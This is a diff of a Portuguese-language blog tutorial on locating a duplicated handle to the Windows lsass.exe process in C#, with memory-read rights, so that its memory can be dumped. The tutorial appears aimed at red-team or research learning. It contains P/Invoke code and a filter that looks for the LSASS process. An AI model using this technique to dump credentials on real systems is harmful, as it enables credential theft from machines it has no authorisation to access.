@@ -376,6 +376,8 @@ No código acima, será acessado o valor `TypeName` de cada handle que está rep
 > - `QueryFullProcessImageName¹²`: API utilizada para descobrir o path do executável de um processo.
 {: .prompt-info }
 
+Partindo para a penúltima etapa, agora será necessário descobrir o caminho do executável que está sendo referenciado no `hDuplicate`. Para isso, a API `QueryFullProcessImageName` se faz presente para cumprir esta função. Esta API é útil para, futurarmente, filtrarmos pelo processo "lsass.exe", onde desde o início foi o nosso alvo.
+
 ```csharp
 [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
 public static extern bool QueryFullProcessImageName(
@@ -401,6 +403,29 @@ if (typeHandle.Equals("Process", StringComparison.OrdinalIgnoreCase))
 }
 ```
 
-Feito isso, a API retornará o caminho do executável referente ao processo referenciado no `hDuplicate`.
+Note, conforme exibido na figura abaixo, os caminhos dos executáveis dos diversos processos que estão passando pelo handle `hDuplicate`. Vale ressaltar que todos esses caminhos simbolizam um handle em aberto para cada um desses executáveis.
 
 ![Desktop View](https://i.imgur.com/mXJ4rvQ.png)
+
+Agora, para filtrar o caminho pelo "lsass.exe", um simples `if`.
+
+```csharp
+if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
+{
+	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
+	{
+		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
+		{
+			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
+		}
+	}
+}
+```
+
+![Desktop View](https://i.imgur.com/Ykf8Jw0.png)
+
+E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e ver as permissões que o handle possui. Se tudo estiver certo, o handle duplicado do LSASS terá herdado as mesmas permissões que o handle original do LSASS (`PROCESS_QUERY_INFORMATION` e `PROCESS_VM_READ`.)
+
+![Desktop View](https://i.imgur.com/g8SRVNL.png)
+
+Maravilha! Depois de todos esses processos, finalmente possuímos um handle válido pro LSASS! E com permissões de leitura de memória! Agora, será possível realizar o dump do processo.
